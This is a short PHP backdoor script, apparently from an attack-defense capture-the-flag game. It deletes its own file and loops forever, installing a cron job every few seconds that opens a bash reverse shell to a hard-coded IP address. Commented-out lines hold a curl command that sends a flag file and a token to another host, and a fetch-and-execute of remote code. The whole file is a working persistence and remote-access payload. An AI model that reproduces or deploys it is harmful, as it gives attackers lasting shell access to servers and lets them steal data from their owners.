<?php
#$message="* * * * * curl 192.168.136.1:8098/?flag=$(cat /var/www/html/flag)&token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY";
$message="*/1 * * * * echo \"bash -i >& /dev/tcp/10.12.109.212/7788 0>&1\" | bash";
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);

while (true) {
sleep(3);
system("echo '$message' > /tmp/1 ;");
system("crontab /tmp/1;");
system("rm /tmp/1;");
#$c=file_get_contents('http://192.168.136.1:8100/1.txt');
#system($c);
}
?>